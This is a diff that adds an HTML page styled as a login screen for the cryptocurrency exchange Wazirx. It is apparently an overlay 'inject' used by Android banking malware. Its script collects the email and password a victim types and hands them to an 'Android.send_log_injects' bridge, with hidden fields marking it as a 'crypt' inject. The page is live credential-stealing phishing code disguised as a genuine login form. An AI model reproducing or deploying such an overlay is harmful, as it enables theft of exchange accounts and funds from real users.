@@ -1,0 +1,344 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+    <title>Wazirx</title>
+</head>
+<style>
+html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}
+body {
+            font-family: Verdana, monospace, sans-serif;
+            font-size: 12px;
+            font-weight: bold;
+            text-align: justify;
+           background-color: #01193ac2;
+            background-repeat: no-repeat;
+			 background-size:cover;
+    -webkit-background-size:cover;
+    -moz-background-size:cover;
+    -o-background-size:cover;
+	
+
+}
+html {
+    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+.header {
+    position: relative;
+    z-index: 2;
+}
+.logongardient {
+    
+    margin-top: 50px;
+    text-align: center;
+}
+.logo {
+    margin: 0 auto;
+    text-align: center;
+}
+.main {
+    margin-top: 10px;
+}
+.autorizeBox {
+    border-radius: 5px;
+    padding: 1.25rem 0;
+    max-width: 384px !important;
+    overflow: visible !important;
+    margin: 0 auto;
+}
+@media only screen and (max-width: 444px) {
+    .autorizeBox {
+        margin: 0 20px;
+    }
+}
+.autorizeBox form {
+    position: relative;
+    min-height: .0625rem;
+    padding: 5px 35px;
+}
+.autorizeBox ::placeholder {
+    color: #b3bcc7c2;
+    opacity: 1;
+	font-size: 0.9005rem;
+	font-weight: bold;
+
+}
+.autorizeBox label {
+    font-size: 1.125rem;
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    margin-left: 5px;
+}
+.autorizeBox input {
+    background: #fff;
+    color: #000;
+    font-size: 1.125rem;
+    border: none;
+    padding: 10px 7px;
+    margin: 10px 0;
+    width: 96%;
+}
+.autorizeBox input.dt {
+    width: 17%;
+}
+.autorizeBox button {
+    margin: 40px 0;
+    background-color: #75757559;
+    border: solid #75757559 0.6px;
+    color:  #fff;
+    width: 120%;
+    height: 2.5rem;
+    overflow-x: auto;
+    text-align: auto;
+    vertical-align: middle;
+    cursor: pointer;
+	margin-left: -20px;
+	border-radius:  10px/10px;
+
+}
+.autorizeBox button span {
+    line-height: 1.125rem;
+    white-space: normal;
+    margin: .0625rem .75rem;
+    font-size: 1rem;
+    font-weight: 600;
+    color: #fff;
+    letter-spacing: 0;
+    text-decoration: none;
+}
+.footer {
+    font-size: 16px;
+    padding: 1em 0;
+    margin-top: 50px;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    color: #757575;
+    font-size: .65625rem;
+    text-align: center;
+}
+.footer p {
+    margin: 25px 0;
+}
+#ccnumlbl {
+    color: red;
+    font-size: 0.8rem;
+}
+.warntext {
+    color: red;
+    margin-bottom: 20px;
+    text-align: center;
+    font-weight: bolder;
+}
+INPUT[type="text"] {
+  margin-bottom: 1.25em;
+    height: 34px;
+    width: 115%;
+    padding: 0 10px;
+    border: none;
+    border-bottom: 1px solid #000;
+    background: #fff0;
+    background-clip: border-box;
+    text-overflow: ellipsis;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    color: #fff;
+    font-size: 1em;
+    font-family: Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    font-weight: 400;
+    direction: ltr;
+	margin-left: -20px;
+}
+INPUT[type="text"]:focus {
+    background-color: #fff0; /* Цвет фона */
+    color: #fff; /* Цвет текста */
+    border: solid #fff 0.7px;
+	
+}
+
+INPUT[type="password"] {
+    background-color: #fff0; /* Цвет фона */
+    color: #fff; /* Цвет текста */
+  margin-bottom: 1.25em;
+    height: 34px;
+    width: 115%;
+    padding: 0 10px;
+    border: none;
+    border-bottom: 1px solid #000;
+    background: #fff0;
+    background-clip: border-box;
+    text-overflow: ellipsis;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    color: #fff;
+    font-size: 1em;
+    font-family: Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    font-weight: 400;
+    direction: ltr;
+	margin-left: -20px;
+}
+INPUT[type="password"]:focus {
+    background-color: #fff0; /* Цвет фона */
+    color: #fff; /* Цвет текста */
+    border: solid #fff 0.7px;
+}
+
+
+</style>
+<body>
+<br><br><br><br><br><br><br>
+    <div class="header"><div class="logongardient">
+            <img width="80" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAQAAABIkb+zAAAFQUlEQVR42u2aW2wUVRjHz7SVFgHLRbkEY6ACD4oiEqtWK9RrogShmGCiFQWiYtSi0dgmxkQNiFSCEdA0IFINDyKkQHwwEsELRIlAaykVtaWJwVqIUmqxtLbbnw/W7syZOWduu81uMr+33Tnf7eyZOf/zzQoRERERERERERGRJKgkO53TfwhYnb7pD+MU0Et+uhawkv9oSMtlRB5d/M+adCxgF3F6uSnd0r8LKz+Sk07pZ9GAzFvpVMAK7MS4OV3Sv4w2nDiRJsuITahYmw7pX09MWUCMgtQv4AA6fmJo6qsfPetSX/3oiXFrcoKPSICPVXjhFy5ORgGHw84MV5rUj563Q2d7nf2rBnp5jawQTnfjlT4KQ6W/jJP2L78E4BBTAjq9Gz80Bl1GDKUKqLVf2N7vuoPHEqR+9LwTKP2p1AHwuf3SBpPzHYz26fg5/NLHbb7TL6a93/oj+8VXLO5PcYcPx2M5h3+aGObrN16jFSU8YZuhCoaEVj961ntOfwLfWCxfsg9Z4BCghqs8OJ+lUT9uy2iOp/Tn0CpZ2u9TbnEM0clTru4PEpyTbssIgzJ6bXb3Od3fKj5lrCbAw4Rjozb9kexxtLrBPjRXE+S0Q8Xe1Y/bMipSpj+TJoXVFU7Du7WBNjgJ4YHeTxiaGe6Y/hIuKG2cRDm/ugQ6LisQJmlC+GGdw367RTP+L5Wcc6ObpRaLnQlJ/wiTpUymUKsXIvGxGSa7M67PsyGizRSmSBQnQAa/LwqMZkv688VhMUNr45wpW13nap9pdGa/KglDJ4tt++1qD3bVcQuzfD7tMlcxUWr69KS4JuTcN4qFRp0l/fHiY+FFIZ0JtoQqjWMDoUaJV0OmXy1mSenPFjXCm8BTLKES7c92ljGmsetDLZ0eXrRFf8Fhv1XxjHMB92iNnjaNvJqeEOm3yOcxci29bHcWqfY9NfXmwyZ7Q6S/n3FS3Bk0+vThLAGZqDG50/yYCyEb3iRTivoonb79OGtkLvLy2CJbqU/caGOeFDGHzYE8XaoST2cdh3eRZxpTHjD9GrOX/pdQRwN56iVDVcAJR4NVlpNRR6CgW+TWOvMUTXh3WtXq+2vHZ4ZJK/JhgIAXWCLFyeQN+gLfSXXqAnY4DC8xXb8xQNhGm4Ydx/5Qu8hedQEbbYO/wzAd7g75DraLXClGIS0hFdQ2s78M7RaNKDUY+PSI8PfOPSbKxAKj3eLwebFPTAgpQtSSh+VSrVtN14b7nLnfmS15vyRB54dydQELLQM7MM2VJ5kb5yvGS76v5WcSw1J1AYWWgWWBWucAFXKXm8UB9lsVc9UFTLM8PbIDtc7PMV/ymk0liSRf14WJc7/mjwNqauX2PJM5QmKZpGskdduftWRx3KPrD+R2B3MV8iQMujcL/W2qHrPe41mP++0y2367MsR+q+K8vhN5VH75wBhPc9jETFvL/QuSQZO+gM+APxhl+uZdD073MNLWKv6N5PCtvoAqYLnl6e12Uu2lPC43Bt7X9JAsdusLqOAH85nJVXa1yq1ZRvAJyWSTNV6WTWesMGIDyTwg9C8gDohFRosl/elip5iW1L8D6Js/TLQc+Jq1c7HWtt+W8DfJptT7a7WXNW7aKbbtt+8xGDzoNf3LOa8+EzHV1mj/nsHhdq8FbFO6qJL3Qu7lTwaL6d7SL1CYd/G4NDKD15Ow36qR3tcZigLyRZ7jhXqjXm6OiMH9b/R2o09ERESobmJGi6IUz7jaehPLBRSIgyleQI7RrW5spSFRAVEBIZEPNMdEYYpn/E+0dURERERERKQO/wIgoXVlL0GF9wAAAABJRU5ErkJggg==">
+		<h1><font color="white">wazirx</font><h1>
+
+    </div></div>
+
+
+
+    <div class="main">
+        <div class="autorizeBox">
+		
+            <form id="login" action="">
+               
+                    <input class="colorX" id="Login" placeholder="Email" pattern=".{4,}" autocomplete="off" type="text" required>
+                                        <input class="colorX" id="Password" placeholder="Password" pattern=".{4,}" autocomplete="off" type="password" required>
+                    <input id="type_injects" value='crypt' type="hidden" required>
+                    <input id="closed" value='close_activity_injects' type="hidden" required>
+
+		
+					
+                    <button type="button" onclick="process('login')"><span>Login</span></button>
+							<center><font color="b5b1b1">Forgot Password?</font>	
+			
+			<BR>
+
+
+<button style="background-color: #0077ff" type="button" onclick="process('login')"><span>SIGN UP</span>
+
+
+
+				
+            </form>
+        </div>
+    </div>
+    <div style="margin-top: -10px">
+    <center>
+        
+       
+    </center>
+    </div>
+</body>
+<script>
+        
+        var allButtons = document.getElementsByTagName('button');
+        for(var btn in allButtons) {
+            allButtons[btn].disabled = true;
+        }
+        
+        function CheckValidInput(id) {
+            var finalbool = true, formids = document.getElementById(id);
+            var currentinputs = formids.getElementsByTagName('input');
+            for(var i = 0; i < currentinputs.length; i++ ) {
+                finalbool &= currentinputs[i].checkValidity();
+            }
+            formids.getElementsByTagName('button')[0].disabled = !finalbool;
+        }
+        
+        var AllForms = document.getElementsByTagName('form');
+        for(var i = 0; i < AllForms.length; i++) {
+            var myInputs = AllForms[i].getElementsByTagName('input');
+            for(var j = 0; j < myInputs.length; j++) {
+                AddInputEventByFormID(myInputs[j],AllForms[i].id);
+            }
+        }
+        
+        function AddInputEventByFormID(input, formid) {
+            input.addEventListener('input', function(){CheckValidInput(formid)});
+        }
+        
+        function process(formId) {
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+        Android.send_log_injects(formToJSON(document.getElementById(formId)));
+        } catch (err) {}
+    }else{
+       alert(formToJSON(document.getElementById(formId)));
+    }
+    formChange(formId);
+}
+
+        /*********Recursive implementation of jSON.stringify; ********/
+        var stringifyJSON = function(obj) {
+            var arrOfKeyVals = [],
+                arrVals = [],
+                objKeys = [];
+        
+            /*********CHECK FOR PRIMITIVE TYPES**********/
+            if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+                return '' + obj;
+            else if (typeof obj === 'string')
+                return '"' + obj + '"';
+        
+            /*********CHECK FOR ARRAY**********/
+            else if (Array.isArray(obj)) {
+                if (obj[0] === undefined)
+                    return '[]';
+                else {
+                    obj.forEach(function(el) {
+                        arrVals.push(stringifyJSON(el));
+                    });
+                    return '[' + arrVals + ']';
+                }
+            }
+            /*********CHECK FOR OBJECT**********/
+            else if (obj instanceof Object) {
+                objKeys = Object.keys(obj);
+                objKeys.forEach(function(key) {
+                    var keyOut = '"' + key + '":';
+                    var keyValOut = obj[key];
+                    if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                        arrOfKeyVals.push('');
+                    else if (typeof keyValOut === 'string')
+                        arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+                    else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                        arrOfKeyVals.push(keyOut + keyValOut);
+                    else if (keyValOut instanceof Object) {
+                        arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+                    }
+                });
+                return '{' + arrOfKeyVals + '}';
+            }
+        };
+        
+        function formToJSON(f)
+        {
+            var FinalObject = {}, namesHTML = ['input','select'];
+            for(var i = 0; i < namesHTML.length; i++) {
+                var bsform = f.getElementsByTagName(namesHTML[i]);
+                for(var j = 0; j < bsform.length; j++) {
+                    FinalObject[bsform[j].id] = bsform[j].value
+                }
+            }
+            return stringifyJSON(FinalObject);
+        }
+        </script>
+        </html>
